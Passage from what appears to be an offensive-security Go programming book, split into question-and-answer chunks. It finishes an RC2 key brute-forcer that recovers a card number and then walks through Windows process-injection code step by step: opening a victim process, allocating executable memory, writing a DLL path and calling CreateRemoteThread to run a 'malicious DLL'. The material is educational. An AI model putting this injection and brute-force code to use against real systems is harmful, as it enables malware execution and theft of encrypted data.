❶\nlog.Fatalln(err)\n}\nvar prodWg, consWg sync.WaitGroup ❷\nvar min, max, prods = uint64(0x0000000000), uint64(0xffffffffff), uint64(75)\nvar step = (max - min) / prods\ndone := make(chan struct{})\nwork := make(chan *CryptoData, 100)\nif (step * prods) < max { ❸\nstep += prods\n}\nvar start, end = min, min + step\nlog.Println(\"Starting producers...\")\nfor i := uint64(0); i < prods; i++ { ❹\nif end > max {\nend = max\n}\ngenerate(start, end, work, done, &prodWg) ❺\nend += step\nstart += step\n}\nlog.Println(\"Producers started!\")\nlog.Println(\"Starting consumers...\")\nfor i := 0; i < 30; i++ { ❻\ndecrypt(ciphertext, work, done, &consWg) ❼\n}\nlog.Println(\"Consumers started!\")\nlog.Println(\"Now we wait...\")\nprodWg.Wait()❽\nclose(work)\nconsWg.Wait()❾\nlog.Println(\"Brute-force complete\")\n}\nListing 11-11: The RC2 main() function (/ch-11/rc2-brute/main.go)\nYour main() function decodes your ciphertext, represented as\na hexadecimal string ❶. Next, you create several variables ❷.\nFirst you create WaitGroup variables used for tracking both\nproducer and consumer goroutines. You also define several\nuint64 values for tracking the minimum value in a 40-bit key\nspace (0x0000000000), the maximum value in the key space\n(0xffffffffff), and the number of producers you intend to start,\nin this case 75. You use these values to calculate a step or\nrange, which represents the number of keys each producer will\niterate, since your intent is to distribute these efforts uniformly\nacross all your producers. You also create a *CryptoData work\nchannel and a done signaling channel. You’ll pass these around\nto your producer and consumer functions.\nSince you’re doing basic integer math to calculate your\nstep value for the producers, there’s a chance that you’ll lose\nsome data if the key space size isn’t a multiple of the number\nof producers you’ll spin up. To account for this—and to avoid\nlosing precision while converting to a floating-point number\nfor use in a call to math.Ceil()—you check whether the maximum\nkey (step * prods) is less than your maximum value for the entire\nkey space (0xffffffffff) ❸. If it is, a handful of values in the\nkey space won’t be accounted for. You simply increase your\nstep value to account for this shortage. You initialize two\nvariables, start and end, to maintain the beginning and ending\noffsets you can use to break apart the key space.\nThe math to arrive at your offsets and step size isn’t precise\nby any means, and it could cause your code to search beyond\nthe end of the maximum allowable key space. However, you\nfix that within a for loop ❹ used to start each of the producers.\nIn the loop, you adjust your ending step value, end, should that\nvalue fall beyond the maximum allowed key space value. Each\niteration of the loop calls generate() ❺, your producer function,\nand passes to it the start (start) and end (end) key space offsets\nfor which the producer will iterate. You also pass it your work\nand done channels, as well as your producer WaitGroup. After\ncalling the function, you shift your start and end variables to\naccount for the next range of key space that will be passed to a\nnew producer. This is how you break up your key space into\nsmaller, more digestible portions that the program can process\nconcurrently, without overlapping efforts between goroutines.\nAfter your producers are spun up, you use a for loop to\ncreate your workers ❻. In this case, you’re creating 30 of\nthem. For each iteration, you call your decrypt() function ❼,\npassing to it the ciphertext, the work channel, the done\nchannel, and the consumer WaitGroup. This spins up your\nconcurrent consumers, which begin to pull and process work\nas the producers create it.\nIterating through the entire key space takes time. If you\ndon’t handle things correctly, the main() function will assuredly\nexit before you discover a key or exhaust key space. So, you\nneed to make sure the producers and consumers have adequate\ntime to either iterate the entire key space or discover the\ncorrect key. This is where your WaitGroups come in. You call\nprodWg.Wait() ❽ to block main() until the producers have\ncompleted their tasks. Recall that the producers have\ncompleted their tasks if they either exhaust the key space or\nexplicitly cancel the process via the done channel. After this\nHivaNetwork.Com\ncompletes, you explicitly close the work channel so the\nconsumers won’t deadlock continually while trying to read\nfrom it. Finally, you block main() again by calling consWg.Wait()\n❾ to give adequate time for the consumers in your WaitGroup to\ncomplete any remaining work in the work channel.\nRunning the Program\nYou’ve completed your program! If you run it, you should see\nthe following output:\n$ go run main.go\n2020/07/12 14:27:47 Starting producers...\n2020/07/12 14:27:47 Producers started!\n2020/07/12 14:27:47 Starting consumers...\n2020/07/12 14:27:47 Consumers started!\n2020/07/12 14:27:47 Now we wait...\n2020/07/12 14:27:48 Card [4532651325506680] found using key [e612d0bbb6]\n2020/07/12 14:27:48 Brute-force complete\nThe program starts the producers and consumers and then\nwaits for them to execute. When a card is found, the program\ndisplays the cleartext card and the key used to decrypt that\ncard. Since we assume this key is the magical key for all cards,\nwe interrupt execution prematurely and celebrate our success\nby painting a self-portrait (not shown).\nOf course, depending on the key value, brute-forcing on a\nhome computer can take a significant amount of time—think\ndays or even weeks. For the preceding sample run, we\nnarrowed the key space to find the key more quickly.\nHowever, completely exhausting the key space on a 2016\nMacBook Pro takes approximately seven days. Not too bad for\na quick-and-dirty solution running on a laptop."
  },
  {
    "input": "Summary",
    "output": "SUMMARY\nCrypto is an important topic for security practitioners, even\nthough the learning curve can be steep. This chapter covered\nsymmetric and asymmetric crypto, hashing, password\nhandling with bcrypt, message authentication, mutual\nauthentication, and brute-forcing RC2. In the next chapter,\nwe’ll get into the nitty-gritty of attacking Microsoft Windows."
  },
  {
    "input": "The Windows API’s OpenProcess() Function",
    "output": "12\nWINDOWS SYSTEM INTERACTION\nAND ANALYSIS\nThere are countless ways of developing Microsoft Windows\nattacks—too many to cover in this chapter. Instead of\ndiscussing them all, we’ll introduce and investigate a few\ntechniques that can help you attack Windows, whether initially\nor during your post-exploitation adventures.\nAfter discussing the Microsoft API documentation and\nsome safety concerns, we’ll cover three topics. First, we’ll use\nGo’s core syscall package to interact with various system-level\nWindows APIs by performing a process injection. Second,\nwe’ll explore Go’s core package for the Windows Portable\nExecutable (PE) format and write a PE file format parser.\nThird, we’ll discuss techniques for using C code with native\nGo code. You’ll need to know these applied techniques in\norder to build a novel Windows attack.\nTHE WINDOWS API’S\nOPENPROCESS() FUNCTION\nIn order to attack Windows, you need to understand the\nWindows API. Let’s explore the Windows API documentation\nby examining the OpenProcess() function, used to obtain a handle\non a remote process. You can find the OpenProcess()\ndocumentation at https://docs.microsoft.com/en-\nus/windows/desktop/api/processthreadsapi/nf-\nprocessthreadsapi-openprocess/. Figure 12-1 shows the\nfunction’s object property details.\nFigure 12-1: The Windows API object structure for OpenProcess()\nIn this particular instance, we can see that the object looks\nvery similar to a struct type in Go. However, the C++ struct\nfield types don’t necessarily reconcile with Go types, and\nMicrosoft data types don’t always match Go data types.\nThe Windows data type definition reference, located at\nhttps://docs.microsoft.com/en-\nus/windows/desktop/WinProg/windows-data-types/, can be\nhelpful when reconciling a Windows data type with Go’s\nrespective data type. Table 12-1 covers the type conversion\nwe’ll use in the process injection examples later in this\nchapter.\nTable 12-1: Mapping Windows Data Types to Go Data Types\nWindows data Type Go data type\nBOOLEAN byte\nBOOL int32\nBYTE byte\nDWORD uint32\nDWORD32 uint32\nDWORD64 uint64\nWORD uint16\nHANDLE uintptr (unsigned integer pointer)\nLPVOID uintptr\nSIZE_T uintptr\nLPCVOID uintptr\nHMODULE uintptr\nLPCSTR uintptr\nLPDWORD uintptr\nThe Go documentation defines the uintptr data type as “an\ninteger type that is large enough to hold the bit pattern of any\npointer.” This is a special data type, as you’ll see when we\ndiscuss Go’s unsafe package and type conversions later in “The\nunsafe.Pointer and uintptr Types” on page 266. For now, let’s\nfinish walking through the Windows API documentation.\nNext, you should look at an object’s parameters; the\nParameters section of the documentation provides details. For\nexample, the first parameter, dwDesiredAccess, provides specifics\nregarding the level of access the process handle should\npossess. After that, the Return Value section defines expected\nvalues for both a successful and failed system call (Figure 12-\n2).\nFigure 12-2: The definition for the expected return value\nWe’ll take advantage of a GetLastError error message when\nusing the syscall package in our upcoming example code,\nalthough this will deviate from the standard error handling\n(such as if err != nil syntax) ever so slightly.\nOur last section of the Windows API document,\nRequirements, provides important details, as shown in Figure\n12-3. The last line defines the dynamic link library (DLL),\nwhich contains exportable functions (such as OpenProcess()) and"
  },
  {
    "input": "The unsafe.Pointer and uintptr Types",
    "output": "will be necessary when we build out our Windows DLL\nmodule’s variable declarations. Said another way, we cannot\ncall the relevant Windows API function from Go without\nknowing the appropriate Windows DLL module. This will\nbecome clearer as we progress into our upcoming process\ninjection example.\nFigure 12-3: The Requirements section defines the library required to call the API.\nTHE UNSAFE.POINTER AND\nUINTPTR TYPES\nIn dealing with the Go syscall package, we’ll most certainly\nneed to step around Go’s type-safety protections. The reason is\nthat we’ll need, for example, to establish shared memory\nstructures and perform type conversions between Go and C.\nThis section provides the groundwork you need in order to\nmanipulate memory, but you should also explore Go’s official\ndocumentation further.\nWe’ll bypass Go’s safety precautions by using Go’s unsafe\npackage (mentioned in Chapter 9), which contains operations\nthat step around the type safety of Go programs. Go has laid\nout four fundamental guidelines to help us out:\nA pointer value of any type can be converted to an unsafe.Pointer.\nAn unsafe.Pointer can be converted to a pointer value of any type.\nA uintptr can be converted to an unsafe.Pointer.\nAn unsafe.Pointer can be converted to a uintptr.\nWARNING\nKeep in mind that packages that import the unsafe package may not be\nportable, and that although Go typically ensures Go version 1 compatibility,\nusing the unsafe package breaks all guarantees of this.\nThe uintptr type allows you to perform type conversion or\narithmetic between native safe types, among other uses.\nAlthough uintptr is an integer type, it’s used extensively to\nrepresent a memory address. When used with type-safe\npointers, Go’s native garbage collector will maintain relevant\nreferences at runtime.\nHowever, the situation changes when unsafe.Pointer is\nintroduced. Recall that uintptr is essentially just an unsigned\ninteger. If a pointer value is created using unsafe.Pointer and then\nassigned to uintptr, there’s no guarantee that Go’s garbage\ncollector will maintain the integrity of the referenced memory\nlocation’s value. Figure 12-4 helps to further describe the\nissue.\nFigure 12-4: A potentially dangerous pointer when using uintptr and unsafe.Pointer\nThe top half of the image depicts uintptr with a reference\nvalue to a Go type-safe pointer. As such, it will maintain its\nreference at runtime, along with austere garbage collection.\nThe lower half of the image demonstrates that uintptr, although\nit references an unsafe.Pointer type, can be garbage collected,\nconsidering Go doesn’t preserve nor manage pointers to\narbitrary data types. Listing 12-1 represents the issue.\nfunc state() {\nvar onload = createEvents(\"onload\") ❶\nvar receive = createEvents(\"receive\") ❷\nvar success = createEvents(\"success\") ❸\nmapEvents := make(map[string]interface{})\nmapEvents[\"messageOnload\"] = unsafe.Pointer(onload)\nmapEvents[\"messageReceive\"] = unsafe.Pointer(receive) ❹\nmapEvents[\"messageSuccess\"] = uintptr(unsafe.Pointer(success)) ❺\n//This line is safe - retains orginal value\nfmt.Println(*(*string)(mapEvents[\"messageReceive\"].(unsafe.Pointer))) ❻\n//This line is unsafe - original value could be garbage collected\nfmt.Println(*(*string)(unsafe.Pointer(mapEvents[\"messageSuccess\"].(uintptr))))\n❼\n}\nfunc createEvents(s string)❽ *string {\nreturn &s\n}\nListing 12-1: Using uintptr both securely and insecurely with unsafe.Pointer\nThis code listing could be someone’s attempt at creating a\nstate machine, for example. It has three variables, assigned\ntheir respective pointer values of onload ❶, receive ❷, and success\n❸ by calling the createEvents() ❽ function. We then create a\nmap containing a key of type string along with a value of type\ninterface{}. We use the interface{} type because it can receive\ndisparate data types. In this case, we’ll use it to receive both\nunsafe.Pointer ❹ and uintptr ❺ values.\nAt this point, you most likely have spotted the dangerous\npieces of code. Although the mapEvents[\"messageRecieve\"] map\nentry ❹ is of type unsafe.Pointer, it still maintains its original\nreference to the receive ❷ variable and will provide the same\nconsistent output ❻ as it did originally. Contrarily, the\nmapEvents[\"messageSuccess\"] map entry ❺ is of type uintptr. This\nmeans that as soon as the unsafe.Pointer value referencing the\nsuccess variable is assigned to a uintptr type, the success variable ❸\nis free to be garbage collected. Again, uintptr is just a type\nholding a literal integer of a memory address, not a reference\nto a pointer. As a result, there’s no guarantee that the expected\noutput ❼ will be produced, as the value may no longer be\nHivaNetwork.Com\npresent.\nIs there a safe way to use uintptr with unsafe.Pointer? We can do\nso by taking advantage of runtime.Keepalive, which can prevent\nthe garbage collection of a variable. Let’s take a look at this by\nmodifying our prior code block (Listing 12-2).\nfunc state() {\nvar onload = createEvents(\"onload\")\nvar receive = createEvents(\"receive\")\nvar success❶ = createEvents(\"success\")\nmapEvents := make(map[string]interface{})\nmapEvents[\"messageOnload\"] = unsafe.Pointer(onload)\nmapEvents[\"messageReceive\"] = unsafe.Pointer(receive)\nmapEvents[\"messageSuccess\"] = uintptr(unsafe.Pointer(success))❷\n//This line is safe - retains orginal value\nfmt.Println(*(*string)(mapEvents[\"messageReceive\"].(unsafe.Pointer)))\n//This line is unsafe - original value could be garbage collected\nfmt.Println(*(*string)(unsafe.Pointer(mapEvents[\"messageSuccess\"].(uintptr))))\nruntime.KeepAlive(success) ❸\n}\nfunc createEvents(s string) *string {\nreturn &s\n}\nListing 12-2: Listing 7-2: Using the runtime.KeepAlive() function to prevent garbage\ncollection of a variable\nSeriously, we’ve added only one small line of code ❸!\nThis line, runtime.KeepAlive(success), tells the Go runtime to ensure\nthat the success variable remains accessible until it’s explicitly\nreleased or the run state ends. This means that although the\nsuccess variable ❶ is stored as uintptr ❷, it can’t be garbage"
  },
  {
    "input": "Performing Process Injection with the syscall Package",
    "output": "collected because of the explicit runtime.KeepAlive() directive.\nBe aware that the Go syscall package extensively uses\nuintptr(unsafe.Pointer()) throughout, and although certain functions,\nlike syscall9(), have type safety through exception, not all the\nfunctions employ this. Further, as you hack about your own\nproject code, you’ll almost certainly run into situations that\nwarrant manipulating heap or stack memory in an unsafe\nmanner.\nPERFORMING PROCESS INJECTION\nWITH THE SYSCALL PACKAGE\nOften, we need to inject our own code into a process. This\nmay be because we want to gain remote command line access\nto a system (shell), or even debug a runtime application when\nthe source code isn’t available. Understanding the mechanics\nof process injection will also help you perform more\ninteresting tasks, such as loading memory-resident malware or\nhooking functions. Either way, this section demonstrates how\nto use Go to interact with the Microsoft Windows APIs in\norder to perform process injection. We’ll inject a payload\nstored on a disk into existing process memory. Figure 12-5\ndescribes the overall chain of events.\nFigure 12-5: Basic process injection\nIn step 1, we use the OpenProcess() Windows function to\nestablish a process handle, along with the desired process\naccess rights. This is a requirement for process-level\ninteraction, whether we’re dealing with a local or remote\nprocess.\nOnce the requisite process handle has been obtained, we\nuse it in step 2, along with the VirtualAllocEx() Windows\nfunction, to allocate virtual memory within the remote process.\nThis is a requirement for loading byte-level code, such as\nshellcode or a DLL, into the remote processes’ memory.\nIn step 3, we load byte-level code into memory by using\nthe WriteProcessMemory() Windows function. At this point in the\ninjection process, we, as attackers, get to decide how creative\nto be with our shellcode or DLL. This is also the place where\nyou might need to inject debugging code when attempting to\nunderstand a running program.\nFinally, in step 4, we use the CreateRemoteThread() Windows\nfunction as a means to call a native exported Windows DLL\nfunction, such as LoadLibraryA(), located in Kernel32.dll, so that\nwe can execute the code previously placed within the process\nby using WriteProcessMemory().\nThe four steps we just described provide a fundamental\nprocess injection example. We’ll define a few additional files\nand functions within our overall process injection example that\naren’t necessarily described here, although we’ll describe them\nin detail as we encounter them.\nDefining the Windows DLLs and Assigning\nVariables\nThe first step is to create the winmods file in Listing 12-3.\n(All the code listings at the root location of / exist under the\nprovided github repo https://github.com/blackhat-go/bhg/.)\nThis file defines the native Windows DLL, which maintains\nexported system-level APIs, that we’ll call by using the Go\nsyscall package. The winmods file contains declarations and\nassignments of more Windows DLL module references than\nrequired for our sample project, but we’ll document them so\nthat you can leverage those in more advanced injection code.\nimport \"syscall\"\nvar (\n❶ ModKernel32 = syscall.NewLazyDLL(\"kernel32.dll\")\nmodUser32 = syscall.NewLazyDLL(\"user32.dll\")\nmodAdvapi32 = syscall.NewLazyDLL(\"Advapi32.dll\")\nProcOpenProcessToken = modAdvapi32.NewProc(\"GetProcessToken\")\nProcLookupPrivilegeValueW =\nmodAdvapi32.NewProc(\"LookupPrivilegeValueW\")\nProcLookupPrivilegeNameW =\nmodAdvapi32.NewProc(\"LookupPrivilegeNameW\")\nProcAdjustTokenPrivileges =\nmodAdvapi32.NewProc(\"AdjustTokenPrivileges\")\nProcGetAsyncKeyState = modUser32.NewProc(\"GetAsyncKeyState\")\nProcVirtualAlloc = ModKernel32.NewProc(\"VirtualAlloc\")\nProcCreateThread = ModKernel32.NewProc(\"CreateThread\")\nProcWaitForSingleObject = ModKernel32.NewProc(\"WaitForSingleObject\")\nProcVirtualAllocEx = ModKernel32.NewProc(\"VirtualAllocEx\")\nProcVirtualFreeEx = ModKernel32.NewProc(\"VirtualFreeEx\")\nProcCreateRemoteThread = ModKernel32.NewProc(\"CreateRemoteThread\")\nProcGetLastError = ModKernel32.NewProc(\"GetLastError\")\nProcWriteProcessMemory = ModKernel32.NewProc(\"WriteProcessMemory\")\n❷ ProcOpenProcess = ModKernel32.NewProc(\"OpenProcess\")\nProcGetCurrentProcess = ModKernel32.NewProc(\"GetCurrentProcess\")\nProcIsDebuggerPresent = ModKernel32.NewProc(\"IsDebuggerPresent\")\nProcGetProcAddress = ModKernel32.NewProc(\"GetProcAddress\")\nProcCloseHandle = ModKernel32.NewProc(\"CloseHandle\")\nProcGetExitCodeThread = ModKernel32.NewProc(\"GetExitCodeThread\")\n)\nListing 12-3: The winmods file (/ch-12/procInjector/winsys/winmods.go)\nWe use the NewLazyDLL() method to load the Kernel32 DLL\n❶. Kernel32 manages much of the internal Windows process\nfunctionality, such as addressing, handling, memory\nallocation, and more. (It’s worth noting that, as of Go version\n1.12.2, you can use a couple of new functions to better load\nDLLs and prevent system DLL hijacking attacks: LoadLibraryEx()\nand NewLazySystemDLL().)\nBefore we can interact with the DLL, we must establish a\nvariable that we can use in our code. We do this by calling\nmodule.NewProc for each API that we’ll need to use. At ❷, we\ncall it against OpenProcess() and assign it to an exported variable\ncalled ProcOpenProcess. The use of OpenProcess() is arbitrary; it’s\nintended to demonstrate the technique for assigning any\nexported Windows DLL function to a descriptive variable\nname.\nObtaining a Process Token with the OpenProcess\nWindows API\nNext, we build out the OpenProcessHandle() function, which we’ll\nuse to obtain a process handle token. We will likely use the\nterms token and handle interchangeably throughout the code,\nbut realize that every process within a Windows system has a\nunique process token. This provides a means to enforce\nrelevant security models, such as Mandatory Integrity Control,\na complex security model (and one that is worth investigating\nin order to get more acquainted with process-level mechanics).\nThe security models consist of such items as process-level\nrights and privileges, for example, and dictate how both\nunprivileged and elevated processes can interact with one\nanother.\nFirst, let’s take a look at the C++ OpenProcess() data structure\nas defined within the Window API documentation (Listing 12-\n4). We’ll define this object as if we intended to call it from\nnative Windows C++ code. However, we won’t be doing this,\nbecause we’ll be defining this object to be used with Go’s\nsyscall package. Therefore, we’ll need to translate this object to\nstandard Go data types.\nHANDLE OpenProcess(\nDWORD❶ dwDesiredAccess,\nBOOL bInheritHandle,\nDWORD dwProcessId\n);\nListing 12-4: An arbitrary Windows C++ object and data types\nThe first necessary task is to translate DWORD ❶ to a usable\ntype that Go maintains. A DWORD is defined by Microsoft as a\n32-bit unsigned integer, which corresponds to Go’s uint32 type.\nThe DWORD value states that it must contain dwDesiredAccess or,\nas the documentation states, “one or more of the process\naccess rights.” Process access rights define the actions we\nwish to take upon a process, given a valid process token.\nWe want to declare a variety of process access rights. Since\nthese values won’t change, we place such relevant values in a\nGo constants file, as shown in Listing 12-5. Each line in this\nlist defines a process access right. The list contains almost\nevery available process access right, but we will use only the\nones necessary for obtaining a process handle.\nconst (\n//\ndocs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights\nPROCESS_CREATE_PROCESS = 0x0080\nPROCESS_CREATE_THREAD = 0x0002\nPROCESS_DUP_HANDLE = 0x0040\nPROCESS_QUERY_INFORMATION = 0x0400\nPROCESS_QUERY_LIMITED_INFORMATION = 0x1000\nPROCESS_SET_INFORMATION = 0x0200\nPROCESS_SET_QUOTA = 0x0100\nPROCESS_SUSPEND_RESUME = 0x0800\nPROCESS_TERMINATE = 0x0001\nPROCESS_VM_OPERATION = 0x0008\nPROCESS_VM_READ = 0x0010\nPROCESS_VM_WRITE = 0x0020\nPROCESS_ALL_ACCESS = 0x001F0FFF\n)\nListing 12-5: A constants section declaring process access rights (/ch-\n12/procInjector/winsys/constants.go)\nAll the process access rights we defined in Listing 12-5\nreconcile with their respective constant hexadecimal values,\nwhich is the format they need to be in to assign them to a Go\nvariable.\nOne issue that we’d like to describe prior to reviewing\nListing 12-6 is that most of the following process injection\nfunctions, not just OpenProcessHandle(), will consume a custom\nobject of type Inject and return a value of type error. The Inject\nstruct object (Listing 12-6) will contain various values that\nwill be provided to the relevant Windows function via syscall.\ntype Inject struct {\nPid uint32\nDllPath string\nDLLSize uint32\nPrivilege string\nRemoteProcHandle uintptr\nLpaddr uintptr\nLoadLibAddr uintptr\nRThread uintptr\nToken TOKEN\nToken TOKEN\n}\ntype TOKEN struct {\ntokenHandle syscall.Token\n}\nListing 12-6: The Inject struct used to hold certain process injection data types (/ch-\n12 /procInjector/winsys/models.go)\nListing 12-7 illustrates our first actual function,\nOpenProcessHandle(). Let’s take a look at the following code block\nand discuss the various details.\nfunc OpenProcessHandle(i *Inject) error {\n❶ var rights uint32 = PROCESS_CREATE_THREAD |\nPROCESS_QUERY_INFORMATION |\nPROCESS_VM_OPERATION |\nPROCESS_VM_WRITE |\nPROCESS_VM_READ\n❷ var inheritHandle uint32 = 0\n❸ var processID uint32 = i.Pid\n❹ remoteProcHandle, _, lastErr❺ := ProcOpenProcess.Call❻(\nuintptr(rights), // DWORD dwDesiredAccess\nuintptr(inheritHandle), // BOOL bInheritHandle\nuintptr(processID)) // DWORD dwProcessId\nif remoteProcHandle == 0 {\nreturn errors.Wrap(lastErr, `[!] ERROR :\nCan't Open Remote Process. Maybe running w elevated integrity?`)\n}\ni.RemoteProcHandle = remoteProcHandle\nfmt.Printf(\"[-] Input PID: %v\\n\", i.Pid)\nfmt.Printf(\"[-] Input DLL: %v\\n\", i.DllPath)\nfmt.Printf(\"[+] Process handle: %v\\n\", unsafe.Pointer(i.RemoteProcHandle))\nreturn nil\n}\nListing 12-7: The OpenProcessHandle() function used to obtain a process handle (/ch-\n12 /procInjector/winsys/inject.go)\nThe code starts by assigning process access rights to the\nuint32 variable called rights ❶. The actual values assigned\ninclude PROCESS_CREATE_THREAD, which allows us to create a\nthread on our remote process. Following that is\nPROCESS_QUERY_INFORMAITON, which gives us the ability to\ngenerically query details about the remote process. The last\nthree process access rights, PROCESS_VM_OPERATION,\nPROCESS_VM_WRITE, and PROCESS_VM_READ, all provide the\naccess rights to manage the remote process virtual memory.\nThe next declared variable, inheritHandle ❷, dictates whether\nour new process handle will inherit the existing handle. We\npass in 0 to indicate a Boolean false value, as we want a new\nprocess handle. Immediately following is the processID ❸\nvariable containing the PID of the victim process. All the\nwhile, we reconcile our variable types with the Windows API\ndocumentation, such that both our declared variables are of\ntype uint32. This pattern continues until we make the system\ncall by using ProcOpenProcess.Call() ❻ .\nThe .Call() method consumes a varying number of uintptr\nvalues, which, if we were to look at the Call() function\nsignature, would be declared literally as ...uintptr. Additionally,\nthe return types are designated as uintptr ❹ and error ❺. Further,\nthe error type is named lastErr ❺, which you’ll find referenced\nin the Windows API documentation, and contains the returned\nerror value as defined by the actual called function.\nManipulating Memory with the VirtualAllocEx\nWindows API\nNow that we have a remote process handle, we need a means\nHivaNetwork.Com\nto allocate virtual memory within the remote process. This is\nnecessary in order to set aside a region of memory and\ninitialize it prior to writing to it. Let’s build that out now.\nPlace the function defined in Listing 12-8 immediately after\nthe function defined in Listing 12-7. (We will continue to\nappend functions, one after another, as we navigate the process\ninjection code.)\nfunc VirtualAllocEx(i *Inject) error {\nvar flAllocationType uint32 = MEM_COMMIT | MEM_RESERVE\nvar flProtect uint32 = PAGE_EXECUTE_READWRITE\nlpBaseAddress, _, lastErr := ProcVirtualAllocEx.Call(\ni.RemoteProcHandle, // HANDLE hProcess\nuintptr(nullRef), // LPVOID lpAddress ❶\nuintptr(i.DLLSize), // SIZE_T dwSize\nuintptr(flAllocationType), // DWORD flAllocationType\n//\nhttps://docs.microsoft.com/en-us/windows/desktop/Memory/memory-protection-constants\nuintptr(flProtect)) // DWORD flProtect\nif lpBaseAddress == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Can't Allocate Memory On Remote\nProcess.\")\n}\ni.Lpaddr = lpBaseAddress\nfmt.Printf(\"[+] Base memory address: %v\\n\", unsafe.Pointer(i.Lpaddr))\nreturn nil\n}\nListing 12-8: Allocating a region of memory in the remote process via VirtualAllocEx\n(/ch-12/procInjector /winsys/inject.go)\nUnlike the previous OpenProcess() system call, we introduce a\nnew detail via the nullRef variable ❶. The nil keyword is\nreserved by Go for all null intents. However, it’s a typed value,\nwhich means that passing it directly via a syscall without a type\nwill result in either a runtime error or a type-conversion error\n—either way, a bad situation. The fix is simple in this case: we\ndeclare a variable that resolves to a 0 value, such as an integer.\nThe 0 value can now be reliably passed and interpreted as a null\nvalue by the receiving Windows function.\nWriting to Memory with the WriteProcessMemory\nWindows API\nNext, we’ll use the WriteProcessMemory() function to write to the\nremote process’s memory region previously initialized using\nthe VirtualAllocEx() function. In Listing 12-9, we’ll keep things\nsimple by calling a DLL by file path, rather than writing the\nentire DLL code into memory.\nfunc WriteProcessMemory(i *Inject) error {\nvar nBytesWritten *byte\ndllPathBytes, err := syscall.BytePtrFromString(i.DllPath) ❶\nif err != nil {\nreturn err\n}\nwriteMem, _, lastErr := ProcWriteProcessMemory.Call(\ni.RemoteProcHandle, // HANDLE hProcess\ni.Lpaddr, // LPVOID lpBaseAddress\nuintptr(unsafe.Pointer(dllPathBytes)), // LPCVOID lpBuffer ❷\nuintptr(i.DLLSize), // SIZE_T nSize\nuintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T\n*lpNumberOfBytesWritten\nif writeMem == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Can't write to process memory.\")\n}\nreturn nil\n}\nListing 12-9: Writing the DLL file path to remote process memory (/ch-\n12/procInjector/winsys/inject.go)\nThe first noticeable syscall function is BytePtrFromString() ❶,\nwhich is a convenience function that consumes a string and\nreturns the base index-0 pointer location of a byte slice, which\nwe’ll assign to dllPathBytes.\nFinally, we get to see unsafe.Pointer in action. The third\nargument to the ProcWriteProcessMemory.Call is defined within the\nWindows API specification as “lpBuffer—a pointer to the buffer\nthat contains data to be written in the address space of the\nspecified process.” In order to pass the Go pointer value\ndefined in dllPathBytes over to the receiving Windows function,\nwe use unsafe.Pointer to circumvent type conversions. One final\npoint to make here is that uintptr and unsafe.Pointer ❷ are\nacceptably safe, since both are being used inline and without\nthe intent of assigning the return value to a variable for later\nreuse.\nFinding LoadLibraryA with the GetProcessAddress\nWindows API\nKernel32.dll exports a function called LoadLibraryA(), which is\navailable on all Windows versions. Microsoft documentation\nstates that LoadLibraryA() “loads the specified module into the\naddress space of the calling process. The specified module\nmay cause other modules to be loaded.” We need to obtain the\nmemory location of LoadLibraryA() before creating a remote\nthread necessary to execute our actual process injection. We\ncan do this with the GetLoadLibAddress() function—one of those\nsupporting functions mentioned earlier (Listing 12-10).\nfunc GetLoadLibAddress(i *Inject) error {\nvar llibBytePtr *byte\nllibBytePtr, err := syscall.BytePtrFromString(\"LoadLibraryA\") ❶\nif err != nil {\nreturn err\n}\nlladdr, _, lastErr := ProcGetProcAddress.Call❷(\nModKernel32.Handle(), // HMODULE hModule ❸\nuintptr(unsafe.Pointer(llibBytePtr))) // LPCSTR lpProcName ❹\nif &lladdr == nil {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Can't get process address.\")\n}\ni.LoadLibAddr = lladdr\nfmt.Printf(\"[+] Kernel32.Dll memory address: %v\\n\",\nunsafe.Pointer(ModKernel32.Handle()))\nfmt.Printf(\"[+] Loader memory address: %v\\n\", unsafe.Pointer(i.LoadLibAddr))\nreturn nil\n}\nListing 12-10: Obtaining the LoadLibraryA() memory address by using the\nGetProcessAddress() Windows function (/ch-12/procInjector/winsys/inject.go)\nWe use the GetProcessAddress() Windows function to identify\nthe base memory address of LoadLibraryA() necessary to call the\nCreateRemoteThread() function. The ProcGetProcAddress.Call() ❷\nfunction takes two arguments: the first is a handle to Kernel32.dll\n❸ that contains the exported function we’re interested in\n(LoadLibraryA()), and the second is the base index-0 pointer\nlocation ❹ of a byte slice returned from the literal string\n\"LoadLibraryA\"\n❶.\nExecuting the Malicious DLL Using the\nCreateRemoteThread Windows API\nWe’ll use the CreateRemoteThread() Windows function to create a\nthread against the remote process’ virtual memory region. If\nthat region happens to be LoadLibraryA(), we now have a means\nto load and execute the region of memory containing the file\npath to our malicious DLL. Let’s review the code in Listing\n12-11.\nfunc CreateRemoteThread(i *Inject) error {\nvar threadId uint32 = 0\nvar dwCreationFlags uint32 = 0\nremoteThread, _, lastErr := ProcCreateRemoteThread.Call❶(\ni.RemoteProcHandle, // HANDLE hProcess ❷\nuintptr(nullRef), // LPSECURITY_ATTRIBUTES lpThreadAttributes\nuintptr(nullRef), // SIZE_T dwStackSize\ni.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress ❸\ni.Lpaddr, // LPVOID lpParameter ❹\nuintptr(dwCreationFlags), // DWORD dwCreationFlags\nuintptr(unsafe.Pointer(&threadId)), // LPDWORD lpThreadId\n)\nif remoteThread == 0 {\nreturn errors.Wrap(lastErr, \"[!] ERROR : Can't Create Remote Thread.\")\n}\ni.RThread = remoteThread\nfmt.Printf(\"[+] Thread identifier created: %v\\n\", unsafe.Pointer(&threadId))\nfmt.Printf(\"[+] Thread handle created: %v\\n\", unsafe.Pointer(i.RThread))\nreturn nil\n}\nListing 12-11: Executing the process injection by using the CreateRemoteThread()\nWindows function (/ch-12 /procInjector/winsys/inject.go)\nThe ProcCreateRemoteThread.Call() ❶ function takes a total of\nseven arguments, although we’ll use only three of them in this\nexample. The relevant arguments are RemoteProcHandle ❷\ncontaining the victim process’s handle, LoadLibAddr ❸\ncontaining the start routine to be called by the thread (in this\ncase, LoadLibraryA()), and, lastly, the pointer ❹ to the virtually\nallocated memory holding the payload location.\nVerifying Injection with the WaitforSingleObject\nWindows API\nWe’ll use the WaitforSingleObject() Windows function to identify\nwhen a particular object is in a signaled state. This is relevant\nto process injection because we want to wait for our thread to\nexecute in order to avoid bailing out prematurely. Let’s briefly\ndiscuss the function definition in Listing 12-12.\nfunc WaitForSingleObject(i *Inject) error 